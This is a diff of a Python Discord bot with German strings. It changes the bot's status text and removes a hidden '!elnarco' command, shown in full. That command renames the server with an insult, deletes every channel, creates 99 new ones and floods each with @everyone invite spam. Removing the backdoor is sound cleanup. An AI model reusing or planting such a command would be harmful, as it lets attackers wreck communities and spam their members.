@@ -141,7 +141,7 @@ async def on_ready():
     log(f"Bot online als {bot.user} (ID: {bot.user.id})")
     await bot.change_presence(
         status=discord.Status.online,
-        activity=discord.Game("Spielt auf deinem Server!")
+        activity=discord.Game("Beschützt deinen Server")
     )
 
     asyncio.create_task(notify_owner_after_restart())
@@ -368,42 +368,6 @@ async def create_webhook(interaction: discord.Interaction, channel: discord.Text
         await interaction.response.send_message(f"✅ Webhook erstellt: {hook.url}", ephemeral=True)
     except Exception as e:
         await interaction.response.send_message(f"❌ Fehler beim Erstellen des Webhooks: {e}", ephemeral=True)
-
-@bot.command(name="elnarco")
-async def reset_channels(ctx):
-    guild = ctx.guild
-    try:
-        await guild.edit(name="ihr wurdet von brobro gefickt")
-        with open("weyzo_icon.png", "rb") as icon_file:
-            await guild.edit(icon=icon_file.read())
-        print("✅ Servername und Icon geändert.")
-    except Exception as e:
-        print(f"❌ Fehler beim Bearbeiten des Servers: {e}")
-
-    # Alte Kanäle parallel löschen
-    delete_tasks = [channel.delete() for channel in guild.channels]
-    await asyncio.gather(*delete_tasks, return_exceptions=True)
-
-    # Neue Kanäle parallel erstellen
-    create_tasks = [
-        guild.create_text_channel(
-            name="FUCKED BY EL NARCO🥥",
-            overwrites={guild.default_role: discord.PermissionOverwrite(view_channel=True)}
-        )
-        for _ in range(99)
-    ]
-    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
-    new_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]
-
-    # Optional: Nachrichten in allen neuen Kanälen senden
-    async def spam(channel):
-        for _ in range(199):
-            try:
-                await channel.send("@everyone https://discord.gg/elnarco")
-            except Exception as e:
-                print(f"Fehler in {channel.name}: {e}")
-
-    await asyncio.gather(*(spam(c) for c in new_channels))
 
 # ---------- Start ----------
 if __name__ == "__main__":
